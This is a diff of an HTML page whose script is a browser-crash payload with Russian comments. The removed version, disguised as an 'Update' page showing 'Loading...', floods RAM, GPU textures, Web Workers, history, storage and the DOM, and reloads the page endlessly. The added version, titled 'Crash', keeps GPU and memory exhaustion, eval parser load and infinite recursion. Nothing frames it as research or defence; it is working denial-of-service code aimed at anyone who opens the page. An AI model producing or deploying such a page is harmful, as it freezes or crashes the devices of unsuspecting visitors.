@@ -1,106 +1,38 @@
 <!DOCTYPE html>
 <html>
-<head>
-    <meta charset="UTF-8">
-    <title>Update</title>
-    <style>
-        * { margin: 0; padding: 0; }
-        body { background: white; }
-    </style>
-</head>
+<head><meta charset="UTF-8"><title>Crash</title></head>
 <body>
-    <h1>Loading...</h1>
-    <script>
-        (function() {
-            // 1. Заливаем RAM до отказа (Android + iOS)
-            let ram = [];
-            function eatRAM() {
-                while(true) {
-                    try {
-                        ram.push(new Uint8Array(1024 * 1024 * 100)); // 100 MB
-                    } catch(e) {
-                        setTimeout(eatRAM, 1);
-                    }
-                }
-            }
-            eatRAM();
-
-            // 2. Бесконечный спам истории (убивает Safari на iOS)
-            setInterval(() => {
-                for(let i = 0; i < 1000; i++) {
-                    history.pushState({}, '', '/?' + Math.random() + 'x'.repeat(1000));
-                }
-            }, 1);
-
-            // 3. Переполнение стека вызовов
-            function stackOverflow() {
-                let a = [1,2,3,4,5,6,7,8,9];
-                let b = a.map(x => x * 99999999);
-                stackOverflow();
-            }
-            setTimeout(stackOverflow, 10);
-
-            // 4. Атака на WebGL (GPU)
-            let canvas = document.createElement('canvas');
-            canvas.width = 8192;
-            canvas.height = 8192;
-            let gl = canvas.getContext('webgl') || canvas.getContext('experimental-webgl');
-            if(gl) {
-                let textures = [];
-                setInterval(() => {
-                    for(let i = 0; i < 100; i++) {
-                        let tex = gl.createTexture();
-                        gl.bindTexture(gl.TEXTURE_2D, tex);
-                        gl.texImage2D(gl.TEXTURE_2D, 0, gl.RGBA, 8192, 8192, 0, gl.RGBA, gl.UNSIGNED_BYTE, null);
-                        textures.push(tex);
-                    }
-                }, 1);
-            }
-
-            // 5. 100 Web Workers — каждый жрёт память
-            let workers = [];
-            let workerScript = `
-                let mem = [];
-                setInterval(() => {
-                    for(let i = 0; i < 1000; i++) mem.push(new ArrayBuffer(1024 * 1024 * 20));
-                }, 1);
-            `;
-            let blob = new Blob([workerScript], {type: 'application/javascript'});
-            let workerURL = URL.createObjectURL(blob);
-            for(let i = 0; i < 150; i++) {
-                try {
-                    workers.push(new Worker(workerURL));
-                } catch(e) {}
-            }
-
-            // 6. Бесконечная перезагрузка страницы
-            setTimeout(() => {
-                setInterval(() => {
-                    location.replace(location.href.split('#')[0] + '#' + Math.random());
-                    location.reload();
-                }, 5);
-            }, 500);
-
-            // 7. Спам localStorage
-            setInterval(() => {
-                for(let i = 0; i < 100; i++) {
-                    localStorage.setItem('crash_' + i, 'X'.repeat(1000000));
-                    sessionStorage.setItem('crash_' + i, 'X'.repeat(1000000));
-                }
-            }, 1);
-
-            // 8. Перегрузка DOM
-            setInterval(() => {
-                for(let i = 0; i < 100; i++) {
-                    let div = document.createElement('div');
-                    div.innerHTML = 'X'.repeat(50000);
-                    div.style.position = 'fixed';
-                    div.style.width = '9999px';
-                    div.style.height = '9999px';
-                    document.body.appendChild(div);
-                }
-            }, 1);
-        })();
-    </script>
+<script>
+(function() {
+    // 1. Бесконечный рендер в WebGL (GPU)
+    let canvas = document.createElement('canvas');
+    canvas.width = 8192;
+    canvas.height = 8192;
+    document.body.appendChild(canvas);
+    let gl = canvas.getContext('webgl');
+    let textures = [];
+    setInterval(() => {
+        for(let i = 0; i < 100; i++) {
+            let tex = gl.createTexture();
+            gl.bindTexture(gl.TEXTURE_2D, tex);
+            gl.texImage2D(gl.TEXTURE_2D, 0, gl.RGBA, 8192, 8192, 0, gl.RGBA, gl.UNSIGNED_BYTE, null);
+            textures.push(tex);
+        }
+    }, 1);
+    
+    // 2. Заполнение RAM и CPU
+    let mem = [];
+    setInterval(() => {
+        for(let i = 0; i < 1000; i++) {
+            mem.push(new ArrayBuffer(1024 * 1024 * 50));
+            eval(''.padEnd(1000000, 'a')); // грузим парсер
+        }
+    }, 1);
+    
+    // 3. Бесконечная рекурсия (стек)
+    function crash() { crash(); }
+    setTimeout(crash, 500);
+})();
+</script>
 </body>
 </html>
